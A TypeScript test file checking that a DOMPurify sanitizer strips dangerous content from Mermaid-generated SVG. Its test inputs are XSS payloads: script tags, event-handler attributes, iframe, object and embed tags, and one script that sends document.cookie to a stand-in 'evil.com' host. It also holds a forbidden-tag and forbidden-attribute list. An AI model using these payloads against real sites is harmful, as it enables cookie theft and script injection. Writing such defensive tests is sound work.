import { describe, it, expect } from 'bun:test';
import DOMPurify from 'dompurify';

describe('Mermaid SVG Sanitization', () => {
  function sanitizeMermaidSVG(svg: string): string {
    return DOMPurify.sanitize(svg, {
      USE_PROFILES: { svg: true },
      FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form'],
      FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur'],
      ALLOWED_TAGS: ['svg', 'g', 'path', 'rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon', 'text', 'tspan', 'defs', 'marker', 'use', 'foreignObject', 'style'],
      KEEP_CONTENT: false
    });
  }

  it('should remove script tags', () => {
    const malicious = '<svg><script>alert("XSS")</script></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('script');
    expect(clean).not.toContain('alert');
  });

  it('should remove onerror handlers', () => {
    const malicious = '<svg><img src=x onerror="alert(1)"></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('alert');
  });

  it('should remove onclick handlers', () => {
    const malicious = '<svg><rect onclick="alert(1)" width="100" height="100"/></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('alert');
  });

  it('should remove onload handlers', () => {
    const malicious = '<svg onload="alert(1)"><rect width="100" height="100"/></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('onload');
    expect(clean).not.toContain('alert');
  });

  it('should remove iframe tags', () => {
    const malicious = '<svg><foreignObject><iframe src="https://evil.com"></iframe></foreignObject></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('iframe');
  });

  it('should remove object tags', () => {
    const malicious = '<svg><object data="evil.swf"></object></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('object');
  });

  it('should remove embed tags', () => {
    const malicious = '<svg><embed src="evil.swf"></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('embed');
  });

  it('should allow safe SVG elements', () => {
    const safe = '<svg><rect width="100" height="100" fill="blue"/></svg>';
    const clean = sanitizeMermaidSVG(safe);
    expect(clean).toContain('rect');
    expect(clean).toContain('fill="blue"');
  });

  it('should allow safe SVG paths', () => {
    const safe = '<svg><path d="M10 10 L20 20" stroke="black"/></svg>';
    const clean = sanitizeMermaidSVG(safe);
    expect(clean).toContain('path');
    expect(clean).toContain('stroke');
  });

  it('should allow text elements', () => {
    const safe = '<svg><text x="10" y="20">Hello</text></svg>';
    const clean = sanitizeMermaidSVG(safe);
    expect(clean).toContain('text');
    expect(clean).toContain('Hello');
  });

  it('should remove onmouseover handlers', () => {
    const malicious = '<svg><rect onmouseover="alert(1)" width="100" height="100"/></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('onmouseover');
  });

  it('should handle complex XSS payloads', () => {
    const malicious = `
      <svg>
        <script>
          fetch('https://evil.com/steal?cookie=' + document.cookie);
        </script>
        <rect onclick="fetch('https://evil.com')" width="100" height="100"/>
      </svg>
    `;
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('script');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('fetch');
    expect(clean).not.toContain('evil.com');
  });

  it('should sanitize content within allowed tags', () => {
    // Even if data URIs are allowed, the content should be sanitized
    const malicious = '<svg><g onload="alert(1)"><rect width="100" height="100"/></g></svg>';
    const clean = sanitizeMermaidSVG(malicious);
    expect(clean).not.toContain('onload');
    expect(clean).not.toContain('alert');
    expect(clean).toContain('rect'); // But safe content is preserved
  });
});
